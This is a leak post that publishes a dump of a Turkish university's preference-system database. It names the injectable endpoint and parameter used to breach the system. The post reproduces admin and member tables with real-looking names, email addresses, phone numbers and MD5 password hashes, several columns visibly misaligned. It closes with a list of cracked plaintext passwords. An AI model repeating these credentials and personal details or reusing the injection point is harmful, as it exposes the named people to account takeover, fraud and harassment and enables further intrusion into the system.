ANADOLU GENÇLİK ÜNİVERSİTESİ TERCİH SİSTEMİ DUMPED

VULN POST : https://tercih.agduniversite.com/ajax.php DATA : ana=0

Database: terc_sorusistem                                                                                                                                                                                            
Table: ws_admin
[36 entries]
+---------+----------------------------------+-------------------------------------+-----------------------------------------------+-----------------------------------------+------------------------------+---------+
| ana_id  | kullanici_id                     | adsoyad                             | eposta                                        | sifre                                   | cinsiyet                     | yetki   |
+---------+----------------------------------+-------------------------------------+-----------------------------------------------+-----------------------------------------+------------------------------+---------+
| Erkek   | 94bc9a5a6123e7c60163c249f0f9ff79 | Demo Y?netici                       | 1                                             | 100                                     | admin@demo.com               | <blank> |
| Erkek   | 94bc9a5a6123e7c60163c249f0f9ff79 | Zahit H?NERLİ                       | 7                                             | 100                                     | zahit@agduniversite.com      | <blank> |
| Erkek   | 94bc9a5a6123e7c60163c249f0f9ff79 | Mehmet Yılmaz                       | 8                                             | 100                                     | yilmaz@agduniversite.com     | <blank> |
| Erkek   | 94bc9a5a6123e7c60163c249f0f9ff79 | Muhammed Demiry?rek                 | 9                                             | 100                                     | demiryurek@agduniversite.com | <blank> |
| Erkek   | 94bc9a5a6123e7c60163c249f0f9ff79 | M.Seyit Batu                        | 10                                            | 100                                     | seyitbatu@agduniversite.com  | <blank> |
| Erkek   | 94bc9a5a6123e7c60163c249f0f9ff79 | Cihan Ge?im                         | 11                                            | 100                                     | gecim@agduniversite.com      | <blank> |
| Erkek   | 94bc9a5a6123e7c60163c249f0f9ff79 | ?mer Faruk Balık?ı                  | 12                                            | 100                                     | balikci@agduniversite.com    | <blank> |
| Erkek   | 94bc9a5a6123e7c60163c249f0f9ff79 | Mehmet Kalabas                      | 13                                            | 100                                     | kalabas@agduniversite.com    | <blank> |
| Erkek   | 94bc9a5a6123e7c60163c249f0f9ff79 | Tayyib Emre Erdel                   | 14                                            | 100                                     | erdel@agduniversite.com      | <blank> |
| Erkek   | 94bc9a5a6123e7c60163c249f0f9ff79 | M. Musa Kendirci                    | 15                                            | 100                                     | kendirci@agduniversite.com   | <blank> |
| Erkek   | 94bc9a5a6123e7c60163c249f0f9ff79 | Furkan Topaloğlu                    | 16                                            | 100                                     | topaloglu@agduniversite.com  | <blank> |
| Erkek   | 94bc9a5a6123e7c60163c249f0f9ff79 | Ahmet Duysal                        | 17                                            | 100                                     | duysal@agduniversite.com     | <blank> |
| Erkek   | 94bc9a5a6123e7c60163c249f0f9ff79 | Mehmet Doğan                        | 18                                            | 100                                     | dogan@agduniversite.com      | <blank> |
| Erkek   | 94bc9a5a6123e7c60163c249f0f9ff79 | Mustafa Karademir                   | 19                                            | 100                                     | karademir@agduniversite.com  | <blank> |
| <blank> | 20                               | Mustafa Karademir                   | mustafakarademir@agduniversite.com            | b6d41e9f36ac8237877de2734dc9f98b        | Erkek                        | 100     |
| 10      | 21                               | Mustafa Karademir                   | mustafakarademirilahiyat@agduniversite.com    | 94bc9a5a6123e7c60163c249f0f9ff79        | Erkek                        | 200     |
| 7       | 22                               | AGD Teknik ve M?h. Hanımlar         | teknikhanimlar@agduniversite.com              | 536a76f94cf7535158f66cfbd4b113b6 (1453) | Kadın                        | 200     |
| 2       | 23                               | AGD Fen Edebiyat Hanımlar           | Fenedebiyathanimlar@agduniversite.com         | 536a76f94cf7535158f66cfbd4b113b6 (1453) | Kadın                        | 200     |
| 1       | 24                               | AGD Sağlık B?l?mleri Hanımlar       | saglikhanimlar@agduniversite.com              | 536a76f94cf7535158f66cfbd4b113b6 (1453) | Kadın                        | 200     |
| 3       | 25                               | AGD Eğitim Hanımlar                 | egitimhanimlar@agduniversite.com              | 536a76f94cf7535158f66cfbd4b113b6 (1453) | Kadın                        | 200     |
| 4       | 26                               | AGD G?zel Sanatlar& Turizm Hanımlar | guzelsanatlarturizmhanimlar@agduniversite.com | 536a76f94cf7535158f66cfbd4b113b6 (1453) | Kadın                        | 200     |
| 5       | 27                               | AGD Hukuk Hanımlar                  | hukukhanimlar@agduniversite.com               | 536a76f94cf7535158f66cfbd4b113b6 (1453) | Kadın                        | 200     |
| 6       | 28                               | AGD İletişim Hanımlar               | iletisimhanimlar@agduniversite.com            | 536a76f94cf7535158f66cfbd4b113b6 (1453) | Kadın                        | 200     |
| 8       | 29                               | AGD Spor Hanımlar                   | sporhanimlar@agduniversite.com                | 536a76f94cf7535158f66cfbd4b113b6 (1453) | Kadın                        | 200     |
| 9       | 30                               | AGD İİBF Hanımlar                   | iibfhanimlar@agduniversite.com                | 536a76f94cf7535158f66cfbd4b113b6 (1453) | Kadın                        | 200     |
| 10      | 31                               | AGD İlahiyat Hanımlar               | ilahiyathanimlar@agduniversite.com            | 536a76f94cf7535158f66cfbd4b113b6 (1453) | Kadın                        | 200     |
| 7       | 32                               | AGD Teknik ve M?hendislik           | teknikmuh@agduniversite.com                   | b386bb3c339a21e5cceb2a61deba6bac        | Erkek                        | 200     |
| 2       | 33                               | AGD Fen Edebiyat                    | fenedebiyat@agduniversite.com                 | b386bb3c339a21e5cceb2a61deba6bac        | Erkek                        | 200     |
| 1       | 34                               | AGD Sağlık Bilimleri                | saglik@agduniversite.com                      | b386bb3c339a21e5cceb2a61deba6bac        | Erkek                        | 200     |
| 3       | 35                               | AGD Eğitim B?l?mleri                | egitim@agduniversite.com                      | b386bb3c339a21e5cceb2a61deba6bac        | Erkek                        | 200     |
| 4       | 36                               | AGD G?zel Sanatlar& Turizm          | guzelsanatlarturizm@agduniversite.com         | b386bb3c339a21e5cceb2a61deba6bac        | Erkek                        | 200     |
| 5       | 37                               | AGD Hukuk                           | hukuk@agduniversite.com                       | b386bb3c339a21e5cceb2a61deba6bac        | Erkek                        | 200     |
| 6       | 38                               | AGD İletişim                        | iletisim@agduniversite.com                    | b386bb3c339a21e5cceb2a61deba6bac        | Erkek                        | 200     |
| 8       | 39                               | AGD Spor                            | spor@agduniversite.com                        | b386bb3c339a21e5cceb2a61deba6bac        | Erkek                        | 200     |
| 9       | 40                               | AGD İİBF                            | iibf@agduniversite.com                        | b386bb3c339a21e5cceb2a61deba6bac        | Erkek                        | 200     |
| 10      | 41                               | AGD İlahiyat                        | ilahiyat@agduniversite.com                    | b386bb3c339a21e5cceb2a61deba6bac        | Erkek                        | 200     |
+---------+----------------------------------+-------------------------------------+-----------------------------------------------+-----------------------------------------+------------------------------+---------+

Database: terc_sorusistem                                                                                                                                                                                                                    
Table: ws_uye
[40 entries]
+------------------------------------+--------+---------------------------------+-----------------------------------------------+------------+-------------+----------+------------------+
| uye_id                             | uye_ad | uye_soyad                       | uye_mail                                      | uye_sifre  | uye_telefon | akt_kodu | durum            |
+------------------------------------+--------+---------------------------------+-----------------------------------------------+------------+-------------+----------+------------------+
| karademirbayburt@gmail.com         | 1      | 0538 700 34 28                  | e10adc3949ba59abbe56e057f20f883e (123456)     | Karademir  | <blank>     | 1        | Mustafa          |
| agduni@agduniversite.com           | 2      | 0551 070 45 26                  | a4013df098e2c0ead75bb33e05e57b70              | ?NİVERSİTE | <blank>     | 1        | AGD              |
| mbyzkya@gmail.com                  | 3      | 0507 117 00 06                  | a2637504c36d99111dd1b3b5ed3a26b2              | Beyazkaya  | <blank>     | 1        | Mustafa B?nyamin |
| nurullah.gungor@outlook.com        | 4      | 0534 693 60 65                  | e10adc3949ba59abbe56e057f20f883e (123456)     | G?ng?r     | <blank>     | 1        | Nurullah         |
| burakagd1453@gmail.com             | 5      | 0553 025 13 25                  | 6ae323c355a16250b66c41004a6f7c0e              | G?l        | <blank>     | 1        | Ahmet Burak      |
| parlakmustafaa@gmail.com           | 6      | 0536 605 19 95                  | a9d9aca535febbe79cad9dece98e8e32              | Parlak     | <blank>     | 1        | Mustafa          |
| zehrafatma43@gmail.com             | 7      | 0543 899 28 68                  | f5a2c1056ba1bd8448fc02841171f1e3              | Akarsu     | <blank>     | 1        | Fatma Zehra      |
| emrullahbe20@gmail.com             | 8      | 0531 520 85 57                  | 878de90ae2fad14fd1d3df867f278a7e              | Bi?en      | <blank>     | 1        | Emrullah         |
| yakup.5880@gmail.com               | 9      | 0536 889 76 58                  | bc8f826d80d081a6dc3c93996529c992              | Yıldız     | <blank>     | 1        | Yakup            |
| altundalsukran@gmail.com           | 10     | 0312 447 26 26                  | a47a1ecaf7085b1e977047e72ba59edb              | Altundal   | <blank>     | 1        | Ş?kran           |
| yb363867@gmail.com                 | 11     | 0554 195 02 03                  | eb84b4cbacd7f794801f5897177e98ed (qwertyu123) | Bulut      | <blank>     | 1        | Yağmur           |
| ahmethidayet571@gmail.com          | 12     | 0553 171 93 20                  | c350081e964298735679d4ca07161243 (20022004)   | Cenik      | <blank>     | 1        | Ahmet Hidayet    |
| eminegnc069@gmail.com              | 13     | 0551 944 11 42                  | b3978840c5efcc0ee8360966590c5cb1              | Gen?       | <blank>     | 1        | Emine Nur        |
| bayraksamil39@gmail.com            | 14     | 0553 131 18 36                  | 186a157b2992e7daed3677ce8e9fe40f (1404)       | BAYRAK     | <blank>     | 1        | Muhammed Şamil   |
| mehmetemincaliskan078@gmail.com    | 15     | 0545 636 54 96                  | 16af2dee0f2e3883a382e925bb811922              | ?alışkan   | <blank>     | 1        | Mehmet Emin      |
| esenkalabdullah2@gmail.com         | 16     | 0543 628 73 58                  | 5b78eaa598a7099eea59e326ebe4bc55              | Esenkal    | <blank>     | 1        | Abdullah         |
| muslimyasirdaghan@gmail.com        | 17     | 0544 207 50 02                  | fbcf1cc76d3d25a2b949d0b50dccd88a              | dağhan     | <blank>     | 1        | yasir            |
| sonmezy369@gmail.com               | 18     | 0538 407 29 55                  | 81dc9bdb52d04dc20036dbd8313ed055 (1234)       | S?nmez     | <blank>     | 1        | Yusuf            |
| mustafamalo41@gmail.com            | 19     | 0530 996 41 47                  | 4e05e2c2719412a48c308a411209063b              | Malo       | <blank>     | 1        | Mustafa          |
| glndadogan@gmail.com               | 20     | 0542 728 05 00                  | 181acec611489544f6e6441a59749b9a              | Doğan      | <blank>     | 1        | G?l nida         |
| aguzelgun4@gmail.com               | 21     | 0534 280 49 53                  | daa4dd3707acd4812b523599e00219f8              | g?zelg?n   | <blank>     | 1        | ali              |
| feeidunyorulmaz64@gmail.com        | 22     | 5387 745 15 55                  | 1fee13c0fd8278bdd34c3bc49c47e574              | Yorulmaz   | <blank>     | 1        | Feridun          |
| gungormuhammedensar@gmail.com      | 23     | 0551 122 73 88                  | 0b196e3a41ef62b7f472e76c517afeb4              | G?ng?r     | <blank>     | 1        | Muhammed Ensar   |
| serifebetulnohutcu@gmail.com       | 24     | 0507 145 42 82                  | f5bcd73d07031e6cb9c69e4dbfccefbf              | NOHUTCU    | <blank>     | 1        | Bet?l            |
| muammerfatihes@gmail.com           | 25     | 0541 887 34 62                  | fddc05a541ac77245ca687b97d9105ff              | ES         | <blank>     | 1        | Muammer Fatih    |
| Beyza.gnlgr69@gmail.com            | 26     | 0554 794 87 42                  | 8da67c043ff002adfb24d66a4c0ce7c4              | G?nl?g?r   | <blank>     | 1        | Beyza            |
| halilislek@hotmail.com             | 27     | 0532 577 02 87                  | 805444a7ce3b49231e603d0edaa8da62              | İŞLEK      | <blank>     | 1        | HALİL            |
| erenoglumuhammetcihad992@gmail.com | 28     | 0532 615 29 84                  | 2930531914cb20779d72f6a55e94c608              | Erenoğlu   | <blank>     | 1        | Muhammet Cihad   |
| btlkya514781@gmail.com             | 29     | 0507 129 26 05                  | 46222d9c21400f001ac3342dbf40a443              | Kaya       | <blank>     | 1        | Fatma Bet?l      |
| taha_2004-fener@hotmail.com        | 30     | 0534 728 79 88                  | 9a0a15de7413c0b018d9004e4697b420              | İbiloğlu   | <blank>     | 1        | İsmail Taha      |
| yigitdemirerenyd@gmail.com         | 31     | 0536 581 77 23                  | a6f023e62d607059c54e4b62aa81ea52              | Demireren  | <blank>     | 1        | Yiğit            |
| test@mail.com                      | 32     | 0537 896 56 56                  | 098f6bcd4621d373cade4e832627b4f6 (test)       | test       | <blank>     | 1        | test             |
| kralahmet7221@gmail.com            | 33     | 0555 058 48 72                  | b3c0b211207e3a8f304839f0a89ed3a3              | ?tleş      | <blank>     | 1        | Ahmet            |
| naciyeuzum347@gmail.com            | 34     | 0552 283 46 46                  | 6b88fdc4d33b0dadd684f360b9f9b00a              | ?z?m       | <blank>     | 1        | Naciye           |
| burakmemis12@icloud.com            | 35     | 0536 253 70 70                  | 0439fa7471feec498aff64d77e8dbf94              | memis      | <blank>     | 1        | burak            |
| alinaras843@gmail.com              | 36     | 0539 371 32 20                  | 2fb615a75a014e5e6c510d72d142dc8a              | Naras      | <blank>     | 1        | Derviş Ali       |
| burak.celik.2000@icloud.com        | 37     | 0531 701 97 01                  | 53f17c0a4c2cd0c9ffec2c9db5ea46e6              | ?elik      | <blank>     | 1        | Ahmet Burak      |
| deveciz597@gmail.com               | 38     | 0538 513 76 02                  | 55da4e831922c451040e858b2c27155d              | Deveci     | <blank>     | 1        | Zehra            |
| elanryuksel@gmail.com              | 39     | 0531 740 26 33                  | 306d9164ebb0ba207d440b9d59199a3a              | Y?ksel     | <blank>     | 1        | Ela Nur          |
+------------------------------------+--------+---------------------------------+-----------------------------------------------+------------+-------------+----------+------------------+
CRACKED
186a157b2992e7daed3677ce8e9fe40f:1404
2930531914cb20779d72f6a55e94c608:Cihat1995
5b78eaa598a7099eea59e326ebe4bc55:Fetih1453
6ae323c355a16250b66c41004a6f7c0e:145307
805444a7ce3b49231e603d0edaa8da62:1453.
81dc9bdb52d04dc20036dbd8313ed055:1234
8da67c043ff002adfb24d66a4c0ce7c4:beyza4242
9a0a15de7413c0b018d9004e4697b420:i1s2m3o4
098f6bcd4621d373cade4e832627b4f6:test
a6f023e62d607059c54e4b62aa81ea52:Trabzon123
b3978840c5efcc0ee8360966590c5cb1:lahmacun
c350081e964298735679d4ca07161243:20022004
e10adc3949ba59abbe56e057f20f883e:123456
eb84b4cbacd7f794801f5897177e98ed:qwertyu123
a4013df098e2c0ead75bb33e05e57b70:b339f4d2
f5bcd73d07031e6cb9c69e4dbfccefbf:bemufa03
80da5d337bf9606dd59f3480a125201e:u]H[ww6KrA9F.x-F
